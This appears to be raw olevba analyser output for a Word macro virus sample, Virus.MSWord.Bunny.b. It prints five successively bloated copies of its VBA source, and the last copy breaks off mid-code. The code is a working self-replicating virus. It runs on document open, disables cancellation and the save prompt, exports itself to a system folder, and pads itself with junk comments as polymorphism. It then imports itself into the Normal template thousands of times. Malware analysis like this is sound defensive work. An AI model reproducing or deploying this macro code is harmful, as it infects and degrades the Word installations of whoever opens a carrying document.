olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bunny.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BunniesB.bas 
in file: ./Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/BunniesB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 'Tester
Public SCode As String
 '
Public stuff As String
 '8961297
' W97T/Bunnies .b
 '
' Word Trojan Bunnies .b variant by Error
 '5163674
Sub AutoOpen()
 '12:15:23
On Error Resume Next
 '
 Application.EnableCancelKey = wdCancelDisabled
 '
Options.SaveNormalPrompt = False
 '9088293
SCode = Dir("C:\windows\system\b.cpl")
 '
If SCode = "b.cpl" Then Call Spread Else
 '12:15:23
ActiveDocument.VBProject.VBComponents("BunniesB").Export ("C:\Windows\System\b.cpl")
 '
Call Spread
 '12:15:23
End Sub
 '
Function Spread()
 '12:15:23
On Error Resume Next
 '
 Application.EnableCancelKey = wdCancelDisabled
 'Tester
' Begin to do what bunnies do...Now with exponential growth!!
 'T
For X = 1 To 10000 Step 1
 '12:15:23
Open "C:\windows\system\b.cpl" For Input As #3
 '12:15:23
Open "C:\Windows\system\bunnies.cpl" For Append As #4
 'Tester
Randomize Timer
 'T
Do
 'T
Line Input #3, stuff
 '
Print #4, stuff
 '12:15:23
    Randomize Timer
 '7617791
    t = Int(Rnd(1) * 5) + 1
 '
        If t = 1 Then Z$ = " '" & Application.UserAddress
 'Tester
        If t = 2 Then Z$ = " '" & Application.UserName
 'Tester
        If t = 3 Then Z$ = " '" & Time$
 '12:15:23
        If t = 4 Then Z$ = " '" & Application.UserInitials
 '12:15:23
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
 '12:15:23
Print #4, Z$
 'T
        Loop Until stuff = "' EOF"
 '7384228
Close #3
 'Tester
Close #4
 'T
' Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error
 '
Kill "C:\Windows\System\b.cpl"
 '12:15:23
Dim OldName
 'T
Dim NewName
 'T
OldName = "C:\Windows\System\bunnies.cpl": NewName = "C:\Windows\System\b.cpl"
 '12:15:23
Name OldName As NewName
 '
    With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\b.cpl")
 'Tester
    End With
 'Tester
Next X
 'Tester
NormalTemplate.Save
 'Tester
MsgBox "Bunnies!!!!", 48
 '
Kill "C:\Windows\System\Bunnies.cpl"
 '5110557
Kill "C:\Windows\System\B.cpl"
 'T
End Function
 '9915977
' EOF
 '
-------------------------------------------------------------------------------
VBA MACRO BunniesB1.bas 
in file: ./Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/BunniesB1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 '12:15:25
 'Tester
 '12:15:25
Public SCode As String
 '12:15:25
 '
 '12:15:25
Public stuff As String
 '733070
 '8961297
 '12:15:25
' W97T/Bunnies .b
 '
 '
 '
' Word Trojan Bunnies .b variant by Error
 '12:15:25
 '5163674
 '
Sub AutoOpen()
 '
 '12:15:23
 'Tester
On Error Resume Next
 '12:15:25
 '
 '3010827
 Application.EnableCancelKey = wdCancelDisabled
 '
 '
 'T
Options.SaveNormalPrompt = False
 'Tester
 '9088293
 'T
SCode = Dir("C:\windows\system\b.cpl")
 'T
 '
 'Tester
If SCode = "b.cpl" Then Call Spread Else
 '6185727
 '12:15:23
 '8590480
ActiveDocument.VBProject.VBComponents("BunniesB").Export ("C:\Windows\System\b.cpl")
 '12:15:25
 '
 '12:15:25
Call Spread
 'T
 '12:15:23
 'T
End Sub
 '3424502
 '
 'Tester
Function Spread()
 'T
 '12:15:23
 'Tester
On Error Resume Next
 '
 '
 '
 Application.EnableCancelKey = wdCancelDisabled
 'Tester
 'Tester
 '12:15:25
' Begin to do what bunnies do...Now with exponential growth!!
 '7349121
 'T
 '
For X = 1 To 10000 Step 1
 '2519186
 '12:15:23
 'Tester
Open "C:\windows\system\b.cpl" For Input As #3
 '372511
 '12:15:23
 '12:15:25
Open "C:\Windows\system\bunnies.cpl" For Append As #4
 '3035342
 'Tester
 '
Randomize Timer
 '7713765
 'T
 'T
Do
 'T
 'T
 'T
Line Input #3, stuff
 '3162338
 '
 '12:15:25
Print #4, stuff
 '12:15:25
 '12:15:23
 '
    Randomize Timer
 'Tester
 '7617791
 'Tester
    t = Int(Rnd(1) * 5) + 1
 'T
 '
 'T
        If t = 1 Then Z$ = " '" & Application.UserAddress
 '6959961
 'Tester
 '
        If t = 2 Then Z$ = " '" & Application.UserName
 '12:15:25
 'Tester
 'Tester
        If t = 3 Then Z$ = " '" & Time$
 '8979640
 '12:15:23
 '
        If t = 4 Then Z$ = " '" & Application.UserInitials
 '12:15:25
 '12:15:23
 '
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
 '
 '12:15:23
 'Tester
Print #4, Z$
 'Tester
 'T
 '3707428
        Loop Until stuff = "' EOF"
 'T
 '7384228
 'T
Close #3
 'Tester
 'Tester
 '12:15:25
Close #4
 'T
 'T
 'Tester
' Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error
 '12:15:25
 '
 '
Kill "C:\Windows\System\b.cpl"
 'T
 '12:15:23
 '1433757
Dim OldName
 '2441554
 'T
 '
Dim NewName
 '12:15:25
 'T
 '
OldName = "C:\Windows\System\bunnies.cpl": NewName = "C:\Windows\System\b.cpl"
 '12:15:25
 '12:15:23
 'Tester
Name OldName As NewName
 '12:15:25
 '
 '12:15:25
    With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\b.cpl")
 '12:15:25
 'Tester
 'Tester
    End With
 '12:15:25
 'Tester
 '8045723
Next X
 '
 'Tester
 'Tester
NormalTemplate.Save
 'T
 'Tester
 '12:15:25
MsgBox "Bunnies!!!!", 48
 '
 '
 '
Kill "C:\Windows\System\Bunnies.cpl"
 '6648766
 '5110557
 'Tester
Kill "C:\Windows\System\B.cpl"
 '12:15:25
 'T
 'Tester
End Function
 '319395
 '9915977
 'T
' EOF
 'T
-------------------------------------------------------------------------------
VBA MACRO BunniesB2.bas 
in file: ./Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/BunniesB2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 '7767478
 '12:15:25
 'T
 'Tester
 '7017760
 '12:15:25
 'T
Public SCode As String
 'T
 '12:15:25
 '
 '
 '7894474
 '12:15:25
 'T
Public stuff As String
 'Tester
 '733070
 'T
 '8961297
 'Tester
 '12:15:25
 'Tester
' W97T/Bunnies .b
 '430310
 '
 '
 '
 '1696184
 '
 '
' Word Trojan Bunnies .b variant by Error
 'Tester
 '12:15:25
 '6759682
 '5163674
 'T
 '
 'T
Sub AutoOpen()
 'Tester
 '
 'Tester
 '12:15:23
 'T
 'Tester
 'T
On Error Resume Next
 '
 '12:15:25
 'T
 '
 '
 '3010827
 '12:15:30
 Application.EnableCancelKey = wdCancelDisabled
 'T
 '
 '12:15:30
 '
 '12:15:30
 'T
 'Tester
Options.SaveNormalPrompt = False
 'T
 'Tester
 '12:15:30
 '9088293
 'T
 'T
 'Tester
SCode = Dir("C:\windows\system\b.cpl")
 '12:15:30
 'T
 'T
 '
 'T
 'Tester
 '7173024
If SCode = "b.cpl" Then Call Spread Else
 '
 '6185727
 'T
 '12:15:23
 'T
 '8590480
 '970648
ActiveDocument.VBProject.VBComponents("BunniesB").Export ("C:\Windows\System\b.cpl")
 '1851448
 '12:15:25
 'T
 '
 'Tester
 '12:15:25
 '
Call Spread
 '12:15:30
 'T
 '12:15:30
 '12:15:23
 'Tester
 'T
 '2138128
End Sub
 '3272920
 '3424502
 '5677673
 '
 '12:15:30
 'Tester
 'T
Function Spread()
 'Tester
 'T
 'T
 '12:15:23
 '12:15:30
 'Tester
 '5673587
On Error Resume Next
 '9475296
 '
 'Tester
 '
 '2392120
 '
 '
 Application.EnableCancelKey = wdCancelDisabled
 '
 'Tester
 'T
 'Tester
 '
 '12:15:25
 '
' Begin to do what bunnies do...Now with exponential growth!!
 '2134042
 '7349121
 'Tester
 'T
 'T
 '
 'T
For X = 1 To 10000 Step 1
 '12:15:30
 '2519186
 '
 '12:15:23
 'T
 'Tester
 '
Open "C:\windows\system\b.cpl" For Input As #3
 'Tester
 '372511
 'T
 '12:15:23
 'Tester
 '12:15:25
 'T
Open "C:\Windows\system\bunnies.cpl" For Append As #4
 'Tester
 '3035342
 '12:15:30
 'Tester
 '3764561
 '
 'T
Randomize Timer
 '12:15:30
 '7713765
 '8828058
 'T
 'Tester
 'T
 '
Do
 '12:15:30
 'T
 'T
 'T
 'T
 'T
 '7869626
Line Input #3, stuff
 '
 '3162338
 '12:15:30
 '
 'T
 '12:15:25
 '1667250
Print #4, stuff
 '2548050
 '12:15:25
 'T
 '12:15:23
 '
 '
 '12:15:30
    Randomize Timer
 '2806128
 'Tester
 '12:15:30
 '7617791
 '
 'Tester
 'Tester
    t = Int(Rnd(1) * 5) + 1
 'Tester
 'T
 'Tester
 '
 '12:15:30
 'T
 '
        If t = 1 Then Z$ = " '" & Application.UserAddress
 '
 '6959961
 '
 'Tester
 'T
 '
 '4694725
        If t = 2 Then Z$ = " '" & Application.UserName
 'Tester
 '12:15:25
 '6501271
 'Tester
 'T
 'Tester
 'Tester
        If t = 3 Then Z$ = " '" & Time$
 '12:15:30
 '8979640
 'Tester
 '12:15:23
 '
 '
 'T
        If t = 4 Then Z$ = " '" & Application.UserInitials
 'T
 '12:15:25
 '
 '12:15:23
 'T
 '
 '2830643
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
 'Tester
 '
 'T
 '12:15:23
 '7640149
 'Tester
 '12:15:30
Print #4, Z$
 '7382071
 'Tester
 'Tester
 'T
 '3711444
 '3707428
 '6243193
        Loop Until stuff = "' EOF"
 'T
 'T
 '
 '7384228
 'T
 'T
 '1437773
Close #3
 '
 'Tester
 '
 'Tester
 '12:15:30
 '12:15:25
 'T
Close #4
 '
 'T
 '1222553
 'T
 '
 'Tester
 '12:15:31
' Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error
 'T
 '12:15:25
 '
 '
 '8817799
 '
 '12:15:31
Kill "C:\Windows\System\b.cpl"
 '12:15:31
 'T
 '5151258
 '12:15:23
 'T
 '1433757
 '
Dim OldName
 '
 '2441554
 'Tester
 'T
 '
 '
 'T
Dim NewName
 '6802207
 '12:15:25
 '9333955
 'T
 'Tester
 '
 '12:15:31
OldName = "C:\Windows\System\bunnies.cpl": NewName = "C:\Windows\System\b.cpl"
 'T
 '12:15:25
 'Tester
 '12:15:23
 '12:15:31
 'Tester
 'Tester
Name OldName As NewName
 '12:15:31
 '12:15:25
 'T
 '
 'T
 '12:15:25
 '12:15:31
    With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\b.cpl")
 '
 '12:15:25
 'Tester
 'Tester
 '
 'Tester
 '5950008
    End With
 '12:15:31
 '12:15:25
 '3549341
 'Tester
 '12:15:31
 '8045723
 '4942211
Next X
 '12:15:31
 '
 'T
 'Tester
 'Tester
 'Tester
 'Tester
NormalTemplate.Save
 'T
 'T
 'Tester
 'Tester
 '12:15:31
 '12:15:25
 '
MsgBox "Bunnies!!!!", 48
 '12:15:31
 '
 '12:15:31
 '
 '
 '
 '12:15:31
Kill "C:\Windows\System\Bunnies.cpl"
 '6027973
 '6648766
 'T
 '5110557
 '12:15:31
 'Tester
 '1091471
Kill "C:\Windows\System\B.cpl"
 '448319
 '12:15:25
 '3107064
 'T
 '7035769
 'Tester
 '12:15:31
End Function
 'T
 '319395
 '575315
 '9915977
 '
 'T
 '12:15:31
' EOF
 '12:15:31
-------------------------------------------------------------------------------
VBA MACRO BunniesB3.bas 
in file: ./Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/BunniesB3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 'Tester
 '7767478
 'Tester
 '12:15:25
 '9511315
 'T
 '12:15:32
 'Tester
 '12:15:32
 '7017760
 'Tester
 '12:15:25
 'T
 'T
 '12:15:32
Public SCode As String
 '12:15:32
 'T
 '12:15:32
 '12:15:25
 'T
 '
 'Tester
 '
 '12:15:32
 '7894474
 '12:15:32
 '12:15:25
 '1915736
 'T
 '12:15:32
Public stuff As String
 'T
 'Tester
 '12:15:32
 '733070
 '12:15:32
 'T
 '12:15:32
 '8961297
 '3181610
 'Tester
 '
 '12:15:25
 '
 'Tester
 'T
' W97T/Bunnies .b
 '12:15:32
 '430310
 '776857
 '
 '12:15:32
 '
 'Tester
 '
 '12:15:32
 '1696184
 '
 '
 '
 '
 '5868956
' Word Trojan Bunnies .b variant by Error
 '12:15:32
 'Tester
 '12:15:32
 '12:15:25
 '2456407
 '6759682
 'T
 '5163674
 'Tester
 'T
 'T
 '
 '
 'T
 'Tester
Sub AutoOpen()
 '
 'Tester
 '
 '
 '4476086
 'Tester
 'Tester
 '12:15:23
 'T
 'T
 'Tester
 'Tester
 'T
 'T
 'T
On Error Resume Next
 'T
 '
 '6127034
 '12:15:25
 'Tester
 'T
 'T
 '
 'T
 '
 'Tester
 '3010827
 'T
 '12:15:30
 'Tester
 Application.EnableCancelKey = wdCancelDisabled
 '9330869
 'T
 '4910523
 '
 'Tester
 '12:15:30
 '12:15:32
 '
 'Tester
 '12:15:30
 '8581151
 'T
 'T
 'Tester
 'T
Options.SaveNormalPrompt = False
 '2120697
 'T
 '12:15:32
 'Tester
 '12:15:32
 '12:15:30
 '
 '9088293
 'T
 'T
 'Tester
 'T
 'T
 'Tester
 'T
SCode = Dir("C:\windows\system\b.cpl")
 '5918320
 '12:15:30
 '
 'T
 'T
 'T
 'Tester
 '
 '7937999
 'T
 'T
 'Tester
 '
 '7173024
 'T
If SCode = "b.cpl" Then Call Spread Else
 '12:15:32
 '
 'T
 '6185727
 '4062410
 'T
 'T
 '12:15:23
 '12:15:32
 'T
 '
 '8590480
 'T
 '970648
 '
ActiveDocument.VBProject.VBComponents("BunniesB").Export ("C:\Windows\System\b.cpl")
 'Tester
 '1851448
 'T
 '12:15:25
 'Tester
 'T
 '12:15:32
 '
 'Tester
 'Tester
 'Tester
 '12:15:25
 '6463077
 '
 'T
Call Spread
 '12:15:32
 '12:15:30
 '1526576
 'T
 'Tester
 '12:15:30
 'T
 '12:15:23
 '
 'Tester
 'Tester
 'T
 '
 '2138128
 'Tester
End Sub
 '12:15:32
 '3272920
 'Tester
 '3424502
 '5713025
 '5677673
 '
 '
 'Tester
 '12:15:30
 '
 'Tester
 'T
 'T
 '4451237
Function Spread()
 'T
 'Tester
 '
 'T
 '6466830
 'T
 'Tester
 '12:15:23
 '12:15:32
 '12:15:30
 '12:15:32
 'Tester
 '12:15:32
 '5673587
 'T
On Error Resume Next
 'Tester
 '9475296
 'Tester
 '
 'Tester
 'Tester
 '522532
 '
 '
 '2392120
 '12:15:32
 '
 '12:15:32
 '
 '12:15:32
 Application.EnableCancelKey = wdCancelDisabled
 '12:15:32
 '
 '1788406
 'Tester
 '12:15:32
 'T
 'Tester
 'Tester
 '2693722
 '
 'Tester
 '12:15:25
 '3959596
 '
 'Tester
' Begin to do what bunnies do...Now with exponential growth!!
 '12:15:32
 '2134042
 '9023094
 '7349121
 '4475752
 'Tester
 '
 'T
 '12:15:32
 'T
 '12:15:32
 '
 '
 'T
 'T
For X = 1 To 10000 Step 1
 '
 '12:15:30
 '4602748
 '2519186
 'Tester
 '
 '7757220
 '12:15:23
 '
 'T
 'Tester
 'Tester
 'Tester
 '
 'T
Open "C:\windows\system\b.cpl" For Input As #3
 '
 'Tester
 'T
 '372511
 '12:15:32
 'T
 '12:15:32
 '12:15:23
 '
 'Tester
 'Tester
 '12:15:25
 'T
 'T
 '
Open "C:\Windows\system\bunnies.cpl" For Append As #4
 '1604208
 'Tester
 '12:15:32
 '3035342
 'Tester
 '12:15:30
 '7937665
 'Tester
 '12:15:32
 '3764561
 '600497
 '
 'Tester
 'T
 '
Randomize Timer
 'T
 '12:15:30
 '9588614
 '7713765
 'T
 '8828058
 '727493
 'T
 '12:15:32
 'Tester
 'T
 'T
 '
 '
 '12:15:32
Do
 '12:15:32
 '12:15:30
 'T
 'T
 'T
 'T
 '4525116
 'T
 '2485008
 'T
 '
 'T
 'T
 '7869626
 '12:15:32
Line Input #3, stuff
 '12:15:32
 '
 '80255
 '3162338
 '12:15:32
 '12:15:30
 'T
 '
 'T
 'T
 'Tester
 '12:15:25
 'T
 '1667250
 '
Print #4, stuff
 '
 '2548050
 'T
 '12:15:25
 'T
 'T
 '
 '12:15:23
 '12:15:32
 '
 '702978
 '
 '
 '12:15:30
 'Tester
    Randomize Timer
 '8814380
 '2806128
 '
 'Tester
 '3779484
 '12:15:30
 '
 '7617791
 '12:15:32
 '
 '
 'Tester
 'Tester
 'Tester
 '12:15:32
    t = Int(Rnd(1) * 5) + 1
 'Tester
 'Tester
 'T
 'T
 '1116653
 'Tester
 'Tester
 '
 'Tester
 '12:15:30
 '12:15:32
 'T
 '
 '
 '108857
        If t = 1 Then Z$ = " '" & Application.UserAddress
 '12:15:32
 '
 '
 '6959961
 'Tester
 '
 'T
 'Tester
 '6307147
 'T
 'Tester
 '
 '
 '4694725
 '
        If t = 2 Then Z$ = " '" & Application.UserName
 '
 'Tester
 'Tester
 '12:15:25
 '12:15:32
 '6501271
 'T
 'Tester
 '1632476
 'T
 'T
 'Tester
 'T
 'Tester
 '6441981
        If t = 3 Then Z$ = " '" & Time$
 '6179817
 '12:15:30
 '
 '8979640
 'T
 'Tester
 'Tester
 '12:15:23
 'Tester
 '
 '5045025
 '
 '
 'T
 '6310899
        If t = 4 Then Z$ = " '" & Application.UserInitials
 '7191700
 'T
 '1374398
 '12:15:25
 'T
 '
 'T
 '12:15:23
 '
 'T
 'Tester
 '
 '12:15:32
 '2830643
 '
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
 '12:15:32
 'Tester
 '
 '
 '12:15:32
 'T
 '9100726
 '12:15:23
 'Tester
 '7640149
 'Tester
 'Tester
 'Tester
 '12:15:30
 '12:15:32
Print #4, Z$
 '12:15:32
 '7382071
 '1144921
 'Tester
 '3803666
 'Tester
 '7732371
 'T
 '12:15:32
 '3711444
 '12:15:32
 '3707428
 '1271917
 '6243193
 '
        Loop Until stuff = "' EOF"
 '12:15:32
 'T
 '
 'T
 'T
 '
 '
 '7384228
 'T
 'T
 'T
 'T
 '
 '1437773
 'Tester
Close #3
 '
 '
 'T
 'Tester
 'T
 '
 'T
 'Tester
 'T
 '12:15:30
 'Tester
 '12:15:25
 '
 'T
 '2849319
Close #4
 'T
 '
 '
 'T
 '7912817
 '1222553
 'Tester
 'T
 'Tester
 '
 '
 'Tester
 'T
 '12:15:31
 'Tester
' Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error
 '9305687
 'T
 '12:15:32
 '12:15:25
 'Tester
 '
 'T
 '
 '12:15:32
 '8817799
 'Tester
 '
 '12:15:32
 '12:15:31
 'T
Kill "C:\Windows\System\b.cpl"
 'Tester
 '12:15:31
 '600164
 'T
 'Tester
 '5151258
 '342086
 '12:15:23
 '12:15:32
 'T
 '6671458
 '1433757
 '9203207
 '
 'T
Dim OldName
 '
 '
 '7060618
 '2441554
 'T
 'Tester
 '
 'T
 '
 '
 '12:15:32
 '
 '1607960
 'T
 '12:15:32
Dim NewName
 '12:15:32
 '6802207
 'T
 '12:15:25
 'T
 '9333955
 '473168
 'T
 '12:15:32
 'Tester
 'T
 '
 'T
 '12:15:31
 'T
OldName = "C:\Windows\System\bunnies.cpl": NewName = "C:\Windows\System\b.cpl"
 'Tester
 'T
 '12:15:32
 '12:15:25
 '9076211
 'Tester
 'T
 '12:15:23
 'Tester
 '12:15:31
 '
 'Tester
 'T
 'Tester
 '9762221
Name OldName As NewName
 'T
 '12:15:31
 '901100
 '12:15:25
 '12:15:33
 'T
 '12:15:33
 '
 '
 'T
 '12:15:33
 '12:15:25
 '12:15:33
 '12:15:31
 'T
    With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\b.cpl")
 'T
 '
 '4698723
 '12:15:25
 '
 'Tester
 '12:15:33
 'Tester
 'Tester
 '
 '
 'Tester
 'T
 '5950008
 'T
    End With
 '
 '12:15:31
 'T
 '12:15:25
 'Tester
 '3549341
 '12:15:33
 'Tester
 'T
 '12:15:31
 '
 '8045723
 '12:15:33
 '4942211
 '
Next X
 '2064494
 '12:15:31
 '6120195
 '
 'Tester
 'T
 '
 'Tester
 'Tester
 'Tester
 '
 'Tester
 '
 'Tester
 'T
NormalTemplate.Save
 '
 'T
 'Tester
 'T
 'Tester
 'Tester
 'T
 'Tester
 '12:15:33
 '12:15:31
 '9663826
 '12:15:25
 '2322572
 '
 'T
MsgBox "Bunnies!!!!", 48
 '5604039
 '12:15:31
 '12:15:33
 '
 'T
 '12:15:31
 'Tester
 '
 '12:15:33
 '
 '
 '
 '282463
 '12:15:31
 '12:15:33
Kill "C:\Windows\System\Bunnies.cpl"
 '
 '6027973
 '12:15:33
 '6648766
 'T
 'T
 '6480753
 '5110557
 'Tester
 '12:15:31
 'Tester
 'Tester
 '12:15:33
 '1091471
 'Tester
Kill "C:\Windows\System\B.cpl"
 '12:15:33
 '448319
 '6095679
 '12:15:25
 '
 '3107064
 'T
 'T
 '
 '7035769
 '2687216
 'Tester
 'Tester
 '12:15:31
 '12:15:33
End Function
 'T
 'T
 '
 '319395
 '12:15:33
 '575315
 'Tester
 '9915977
 '
 '
 'T
 'T
 'T
 '12:15:31
 '
' EOF
 'T
-------------------------------------------------------------------------------
VBA MACRO BunniesB4.bas 
in file: ./Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/BunniesB4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 '2393365
 'Tester
 '
 '7767478
 '
 'Tester
 'Tester
 '12:15:25
 '7870871
 '9511315
 'Tester
 'T
 '12:15:34
 '12:15:32
 'T
 'Tester
 'Tester
 '12:15:32
 'T
 '7017760
 'Tester
 'Tester
 'T
 '12:15:25
 '
 'T
 'T
 'T
 '
 '12:15:32
 'Tester
Public SCode As String
 'Tester
 '12:15:32
 '12:15:34
 'T
 'Tester
 '12:15:32
 'T
 '12:15:25
 'Tester
 'T
 '12:15:34
 '
 'T
 'Tester
 'T
 '
 '8128949
 '12:15:32
 '12:15:34
 '7894474
 '
 '12:15:32
 '
 '12:15:25
 'Tester
 '1915736
 'T
 'T
 'T
 '12:15:32
 'Tester
Public stuff As String
 'Tester
 'T
 '9423424
 'Tester
 '12:15:34
 '12:15:32
 '12:15:34
 '733070
 'Tester
 '12:15:32
 '3094052
 'T
 '4228845
 '12:15:32
 '6633598
 '8961297
 'T
 '3181610
 '5883879
 'Tester
 'T
 '
 'T
 '12:15:25
 '
 '
 '6760594
 'Tester
 'T
 'T
 'Tester
' W97T/Bunnies .b
 '3348045
 '12:15:32
 'Tester
 '430310
 '
 '776857
 'T
 '
 '
 '12:15:32
 'T
 '
 '12:15:34
 'Tester
 'T
 '
 '7022424
 '12:15:32
 '12:15:34
 '1696184
 'Tester
 '
 'Tester
 '
 '2344001
 '
 'Tester
 '
 '8673373
 '5868956
 '1205122
' Word Trojan Bunnies .b variant by Error
 'T
 '12:15:32
 '9423091
 'Tester
 '12:15:34
 '12:15:32
 '12:15:34
 '12:15:25
 '4486590
 '2456407
 '
 '6759682
 '3609875
 'T
 '
 '5163674
 '
 'Tester
 'Tester
 'T
 'T
 'T
 'T
 '
 '
 '
 '
 'T
 '
 'Tester
 '12:15:34
Sub AutoOpen()
 '
 '
 'T
 'Tester
 '
 '
 'T
 '
 '352923
 '4476086
 'Tester
 'Tester
 '
 'Tester
 'T
 '12:15:23
 'T
 'T
 'T
 'T
 'T
 'Tester
 'T
 'Tester
 '12:15:34
 'T
 'Tester
 'T
 '12:15:34
 'T
 '
On Error Resume Next
 '12:15:34
 'T
 'Tester
 '
 '12:15:34
 '6127034
 'T
 '12:15:25
 '
 'Tester
 '8882420
 'T
 '2811126
 'T
 'Tester
 '
 '
 'T
 '6350671
 '
 '
 'Tester
 '2553048
 '3010827
 '12:15:34
 'T
 '
 '12:15:30
 '
 'Tester
 '6477667
 Application.EnableCancelKey = wdCancelDisabled
 '
 '9330869
 '12:15:34
 'T
 '3065118
 '4910523
 'T
 '
 '
 'Tester
 'T
 '12:15:30
 '8751338
 '12:15:32
 '
 '
 '
 'Tester
 '5084797
 '12:15:30
 'Tester
 '8581151
 'T
 'T
 '
 'T
 '12:15:34
 'Tester
 'T
 'T
 '
Options.SaveNormalPrompt = False
 'Tester
 '2120697
 '12:15:34
 'T
 'T
 '12:15:32
 '
 'Tester
 '
 '12:15:32
 'Tester
 '12:15:30
 '12:15:34
 '
 '12:15:34
 '9088293
 '
 'T
 'Tester
 'T
 'T
 'Tester
 '
 'T
 '12:15:34
 'T
 'Tester
 'Tester
 '
 'T
 'T
SCode = Dir("C:\windows\system\b.cpl")
 '4101516
 '5918320
 '6633264
 '12:15:30
 'T
 '
 '12:15:34
 'T
 'T
 'T
 'Tester
 'T
 '
 'Tester
 '
 '
 '12:15:34
 '7937999
 '12:15:34
 'T
 'T
 'T
 '12:15:34
 'Tester
 '1700516
 '
 '
 '7173024
 'T
 'T
 '12:15:34
If SCode = "b.cpl" Then Call Spread Else
 '12:15:34
 '12:15:32
 '9295762
 '
 '12:15:34
 'T
 'T
 '6185727
 '5629221
 '4062410
 'T
 'T
 'Tester
 'T
 '
 '12:15:23
 'T
 '12:15:32
 '
 'T
 '
 '
 '12:15:34
 '8590480
 'Tester
 'T
 '12:15:34
 '970648
 'Tester
 '
 '
ActiveDocument.VBProject.VBComponents("BunniesB").Export ("C:\Windows\System\b.cpl")
 'T
 'Tester
 '
 '1851448
 'Tester
 'T
 'Tester
 '12:15:25
 '12:15:34
 'Tester
 '12:15:34
 'T
 '2450234
 '12:15:32
 '5108979
 '
 'T
 'Tester
 '8390446
 'Tester
 '12:15:34
 'Tester
 '2577230
 '12:15:25
 'T
 '6463077
 'Tester
 '
 '
 'T
 'T
Call Spread
 'T
 '12:15:32
 'Tester
 '12:15:30
 'T
 '1526576
 '3326949
 'T
 '7382650
 'Tester
 'T
 '12:15:30
 'T
 'T
 '12:15:34
 '12:15:23
 'T
 '
 'T
 'Tester
 'T
 'Tester
 '6145377
 'T
 'T
 '
 'T
 '2138128
 '
 'Tester
 '
End Sub
 '
 '12:15:32
 '
 '3272920
 '12:15:34
 'Tester
 'T
 '3424502
 'T
 '5713025
 'Tester
 '5677673
 '9557926
 '
 '12:15:34
 '
 '823801
 'Tester
 'Tester
 '12:15:30
 'Tester
 '
 '5887299
 'Tester
 'T
 'T
 'T
 'T
 'Tester
 '4451237
 'Tester
Function Spread()
 'T
 'T
 '
 'Tester
 '12:15:34
 '
 '
 'T
 '
 '6466830
 'Tester
 'T
 '8726489
 'Tester
 '12:15:34
 '12:15:23
 '12:15:34
 '12:15:32
 '3789988
 '12:15:30
 '3146836
 '12:15:32
 '5805581
 'Tester
 '9734286
 '12:15:32
 '12:15:34
 '5673587
 'T
 'T
 '3273832
On Error Resume Next
 '
 'Tester
 '12:15:34
 '9475296
 '12:15:34
 'Tester
 '4801870
 '
 'T
 'Tester
 'T
 'Tester
 '
 '522532
 'Tester
 '
 '
 '
 'T
 '2392120
 '12:15:34
 '12:15:32
 'T
 '
 '12:15:34
 '12:15:32
 'Tester
 '
 '5834182
 '12:15:32
 '
 Application.EnableCancelKey = wdCancelDisabled
 '12:15:34
 '12:15:32
 '
 '
 '
 '1788406
 'Tester
 'Tester
 '
 '12:15:32
 '
 'T
 '
 'Tester
 '12:15:34
 'Tester
 '
 '2693722
 'T
 '
 'T
 'Tester
 'Tester
 '12:15:25
 '
 '3959596
 '12:15:34
 '
 'Tester
 'Tester
 '
' Begin to do what bunnies do...Now with exponential growth!!
 'Tester
 '12:15:32
 '12:15:34
 '2134042
 '
 '9023094
 '
 '7349121
 '2036559
 '4475752
 '12:15:34
 'Tester
 'T
 '
 '3326615
 'T
 'T
 '12:15:32
 'Tester
 'T
 'T
 '12:15:32
 '
 '
 'Tester
 '
 '
 'T
 '
 'T
 '5346294
For X = 1 To 10000 Step 1
 'Tester
 '
 'T
 '12:15:30
 'Tester
 '4602748
 '12:15:34
 '2519186
 'T
 'Tester
 'T
 '
 '6997243
 '7757220
 'Tester
 '12:15:23
 'T
 '
 'T
 'T
 '794867
 'Tester
 '1675667
 'Tester
 'T
 'Tester
 '12:15:34
 '
 '12:15:34
 'T
 '1933745
Open "C:\windows\system\b.cpl" For Input As #3
 '5989446
 '
 'Tester
 'Tester
 '3097139
 'T
 '5501892
 '372511
 '12:15:34
 '12:15:32
 'T
 'T
 'Tester
 '12:15:32
 'T
 '12:15:23
 '12:15:34
 '
 '5497806
 'Tester
 '9299515
 'Tester
 'Tester
 '12:15:25
 '2216338
 'T
 '
 'T
 '
 '
 '5755884
Open "C:\Windows\system\bunnies.cpl" For Append As #4
 '
 '1604208
 '1958260
 'Tester
 'Tester
 '12:15:32
 '4494095
 '3035342
 'T
 'Tester
 '12:15:34
 '12:15:30
 '6509688
 '7937665
 'T
 'Tester
 '2839061
 '12:15:32
 '5370810
 '3764561
 'T
 '600497
 'Tester
 '
 '3228221
 'Tester
 '4490009
 'T
 '12:15:34
 '
 '1753632
Randomize Timer
 '4412377
 'T
 '8341082
 '12:15:30
 '
